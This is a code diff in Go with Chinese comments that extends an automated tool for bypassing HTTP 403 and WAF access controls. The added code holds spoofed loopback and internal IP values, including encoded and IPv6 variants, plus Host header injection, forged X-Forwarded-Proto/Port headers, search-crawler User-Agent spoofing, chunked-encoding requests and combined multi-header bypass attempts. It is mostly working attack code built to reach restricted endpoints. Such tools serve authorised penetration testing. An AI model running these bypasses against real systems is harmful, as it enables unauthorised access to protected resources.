@@ -36,18 +36,33 @@ var bypassIPHeaders = []string{
 	"X-Host",
 }
 
-// bypassIPValues 伪造 IP 值
+// bypassIPValues 伪造 IP 值（含 IPv6、编码变体、scheme 前缀）
 var bypassIPValues = []string{
+	// 标准 IPv4
 	"127.0.0.1",
 	"127.0.0.1:80",
 	"127.0.0.1:443",
+	"127.0.0.1:8080",
 	"localhost",
 	"0.0.0.0",
 	"0",
+	// 内网段
 	"10.0.0.1",
 	"172.16.0.1",
 	"192.168.0.1",
 	"192.168.1.1",
+	// IPv6 回环（ref: iamj0ker/bypass-403, CSDN 20个403 bypass）
+	"::1",
+	"[::1]",
+	"0000::1",
+	// IPv4 短形式 & 编码变体（ref: CSDN, Medium WAF bypass 2025）
+	"127.1",
+	"0x7f000001",
+	"2130706433",
+	"0177.0.0.1",
+	// 带 scheme 前缀（ref: iamj0ker/bypass-403）
+	"http://127.0.0.1",
+	"https://127.0.0.1",
 }
 
 // bypassPathHeaders 用于路径重写的请求头
@@ -171,7 +186,116 @@ func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBa
 		desc:    "POST+Content-Length:0",
 	})
 
-	// 6. 智能 HTTP 方法测试: 先 GET/POST，都被拦截则 OPTIONS 探测后精准测试
+	// 6. Host 头注入（ref: CSDN 20个403 bypass, 掘金）
+	// 某些反向代理根据 Host 头做访问控制，注入 localhost 可绕过
+	for _, hostVal := range []string{"localhost", "127.0.0.1", "0.0.0.0"} {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{"Host": hostVal},
+			desc:    fmt.Sprintf("Host[%s]", hostVal),
+		})
+	}
+
+	// 7. X-Forwarded-Proto/Port/Scheme（ref: CSDN, Medium WAF bypass 2025）
+	// 某些中间件根据协议/端口做策略，伪造可绕过 HTTPS-only 或端口限制
+	for _, proto := range []string{"https", "http", "ws", "wss"} {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{"X-Forwarded-Proto": proto},
+			desc:    fmt.Sprintf("X-Forwarded-Proto[%s]", proto),
+		})
+	}
+	for _, port := range []string{"80", "443", "8080", "8443", "4443"} {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{"X-Forwarded-Port": port},
+			desc:    fmt.Sprintf("X-Forwarded-Port[%s]", port),
+		})
+	}
+	cases = append(cases, testCase{
+		method:  "GET",
+		url:     url + auth,
+		headers: map[string]string{"X-Forwarded-Scheme": "https"},
+		desc:    "X-Forwarded-Scheme[https]",
+	})
+
+	// 8. User-Agent 伪装（ref: Medium WAF bypass, CSDN）
+	// 部分 WAF/ACL 白名单搜索引擎爬虫和内部监控 UA
+	spoofUAs := []string{
+		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+		"curl/7.68.0",
+		"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
+	}
+	for _, ua := range spoofUAs {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{"User-Agent": ua},
+			desc:    fmt.Sprintf("UserAgent[%s]", truncateStr(ua, 40)),
+		})
+	}
+
+	// 9. Transfer-Encoding: chunked（ref: Medium WAF bypass 2025）
+	// 某些 WAF 不检查 chunked 编码的请求体
+	cases = append(cases, testCase{
+		method: "POST",
+		url:    url + auth,
+		headers: map[string]string{
+			"Transfer-Encoding": "chunked",
+			"Content-Type":      "application/x-www-form-urlencoded",
+		},
+		desc: "POST+Transfer-Encoding:chunked",
+	})
+
+	// 10. Accept 头操纵（ref: Medium WAF bypass）
+	// 不同 Accept 头可能触发不同的处理链路
+	for _, accept := range []string{"application/json", "text/html", "*/*", "application/xml"} {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{"Accept": accept},
+			desc:    fmt.Sprintf("Accept[%s]", accept),
+		})
+	}
+
+	// 11. 多头组合攻击（实战高效 — 同时注入多个绕过头增加命中率）
+	cases = append(cases, testCase{
+		method: "GET",
+		url:    url + auth,
+		headers: map[string]string{
+			"X-Forwarded-For":  "127.0.0.1",
+			"X-Real-IP":        "127.0.0.1",
+			"X-Originating-IP": "127.0.0.1",
+		},
+		desc: "Combo[XFF+RealIP+OriginIP=127.0.0.1]",
+	})
+	cases = append(cases, testCase{
+		method: "GET",
+		url:    url + auth,
+		headers: map[string]string{
+			"X-Forwarded-For":   "127.0.0.1",
+			"X-Forwarded-Host":  "127.0.0.1",
+			"X-Forwarded-Proto": "https",
+		},
+		desc: "Combo[XFF+XFHost+Proto]",
+	})
+	cases = append(cases, testCase{
+		method: "GET",
+		url:    url + auth,
+		headers: map[string]string{
+			"X-Original-URL":             auth,
+			"X-Custom-IP-Authorization":  "127.0.0.1",
+			"X-Forwarded-For":            "127.0.0.1",
+		},
+		desc: "Combo[OrigURL+CustomIP+XFF]",
+	})
+
+	// 12. 智能 HTTP 方法测试: 先 GET/POST，都被拦截则 OPTIONS 探测后精准测试
 	methodCases := discoverAndBuildMethodCases(url+auth, origLen, origCode, debug)
 	cases = append(cases, methodCases...)
 
@@ -352,7 +476,7 @@ func discoverAndBuildMethodCases(targetURL string, origLen, origCode, debug int)
 // buildFallbackMethodCases OPTIONS 不可用时，回退测试少量常见方法
 func buildFallbackMethodCases(targetURL string) []testCase {
 	// 只测试最有可能产生差异的几个方法，不盲测全部
-	fallbackMethods := []string{"PUT", "PATCH", "HEAD"}
+	fallbackMethods := []string{"PUT", "PATCH", "HEAD", "TRACE"}
 
 	fmt.Printf(Blue("[+] OPTIONS 不可用，回退测试: %v\n"), fallbackMethods)
 
